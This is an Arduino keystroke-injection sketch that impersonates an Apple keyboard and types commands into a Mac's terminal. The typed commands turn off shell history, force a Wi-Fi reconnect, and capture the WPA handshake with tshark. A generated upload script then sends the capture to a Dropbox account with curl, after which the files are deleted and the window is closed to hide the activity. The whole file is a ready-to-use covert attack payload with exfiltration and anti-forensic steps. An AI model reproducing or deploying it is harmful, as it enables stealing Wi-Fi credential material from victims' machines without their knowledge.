// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script discreetly grabs the .PCAP that will contain the FOUR EAPOL handshake keys
  // then zips the file renaming it Captured Handshake and sends it directly to your dropbox API.
  // Replace '<API ACCESS TOKEN>' with your actual API access token.
  // Requirements Wireshark (tshark) can download using the command 'brew install wireshark'
  // Dropbox API token, you can find Documentation under my Executions readme.
  // Author: Narsty
  // Title: EAPOL Handshake to Dropbox
  // Version 1.0 MacOs
  // Category: Execution
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" networksetup -setairportpower en0 off");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print(" tshark -i en0 -w ~/Desktop/captured.pcap &");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(6000);

  Keyboard.print(" networksetup -setairportpower en0 on");

  delay(500);

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print(" pkill -f tshark");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print(" echo 'cd ~/Desktop && zip -r \"CapturedHandshake.zip\" captured.pcap && curl -X POST https://content.dropboxapi.com/2/files/upload -H \"Authorization: Bearer <API ACCESS TOKEN>\" -H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/Backup/CapturedHandshake.zip\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false}\" -H \"Content-Type: application/octet-stream\" --data-binary @\"CapturedHandshake.zip\"' > upload.sh");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" chmod +x upload.sh");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" nohup ./upload.sh >/dev/null 2>&1 &");

  delay(500);

  typeKey(KEY_RETURN);

  delay(10000);

  Keyboard.print(" rm ~/Desktop/captured.pcap");

  delay(500);

  typeKey(KEY_RETURN);

  Keyboard.print(" rm ~/Desktop/CapturedHandshake.zip");

  delay(500);

  typeKey(KEY_RETURN);

  Keyboard.print(" rm upload.sh");

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}